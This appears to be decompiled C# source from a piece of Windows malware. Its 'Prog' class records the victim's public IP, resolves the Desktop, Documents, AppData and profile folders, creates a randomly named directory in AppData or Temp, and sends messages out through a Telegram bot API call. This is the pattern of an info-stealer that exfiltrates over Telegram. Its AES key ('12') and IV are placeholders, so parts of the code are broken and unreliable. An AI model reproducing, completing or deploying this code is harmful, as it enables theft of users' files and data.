﻿using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;

namespace SHARP
{
	// Token: 0x02000061 RID: 97
	internal class Prog
	{
		// Token: 0x0600021D RID: 541 RVA: 0x0000D250 File Offset: 0x0000B450
		public static string Encrypt(string plainText)
		{
			string result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Prog.Key;
				aes.IV = Prog.IV;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plainText);
						}
					}
					result = Convert.ToBase64String(memoryStream.ToArray());
				}
			}
			return result;
		}

		// Token: 0x0600021E RID: 542 RVA: 0x0000D31C File Offset: 0x0000B51C
		public static string Decrypt(string cipherText)
		{
			byte[] buffer = Convert.FromBase64String(cipherText);
			string result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Prog.Key;
				aes.IV = Prog.IV;
				ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		// Token: 0x0600021F RID: 543 RVA: 0x0000D3E8 File Offset: 0x0000B5E8
		public static void SendMessage(string token, string chatId, string message)
		{
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					string requestUri = string.Concat(new string[]
					{
						"https://api.telegram.org/bot",
						token,
						"/sendMessage?chat_id=",
						chatId,
						"&text=",
						message
					});
					HttpResponseMessage result = httpClient.GetAsync(requestUri).Result;
					if (result.IsSuccessStatusCode)
					{
						Console.WriteLine("Сообщение успешно отправлено!");
					}
					else
					{
						Console.WriteLine(string.Format("Ошибка при отправке сообщения: {0}", result.StatusCode));
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Ошибка: " + ex.Message);
			}
		}

		// Token: 0x06000220 RID: 544 RVA: 0x0000D4A8 File Offset: 0x0000B6A8
		public static bool IsFutureDate(DateTime targetDate)
		{
			return targetDate > DateTime.Now;
		}

		// Token: 0x04000122 RID: 290
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x04000123 RID: 291
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000124 RID: 292
		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

		// Token: 0x04000125 RID: 293
		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000126 RID: 294
		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

		// Token: 0x04000127 RID: 295
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x04000128 RID: 296
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x04000129 RID: 297
		public static int acc = 0;

		// Token: 0x0400012A RID: 298
		private static readonly byte[] Key = Encoding.UTF8.GetBytes("12");

		// Token: 0x0400012B RID: 299
		private static readonly byte[] IV = Encoding.UTF8.GetBytes("YourInitializationVector");

		// Token: 0x0400012C RID: 300
		public static string IP = new WebClient().DownloadString("https://api.ipify.org/");

		// Token: 0x0400012D RID: 301
		public static string[] SysPatch = new string[]
		{
			Prog.LocalData,
			Prog.AppDate,
			Path.GetTempPath()
		};

		// Token: 0x0400012E RID: 302
		public static string RandomSysPatch = Prog.SysPatch[new Random().Next(0, Prog.SysPatch.Length)];

		// Token: 0x0400012F RID: 303
		public static string ApiUrl = "https://api.telegram.org/bot";

		// Token: 0x04000130 RID: 304
		public static string dir = Prog.RandomSysPatch + "\\" + GenStrings.Generate() + GenStrings.GenNumbersTo().ToString();
	}
}
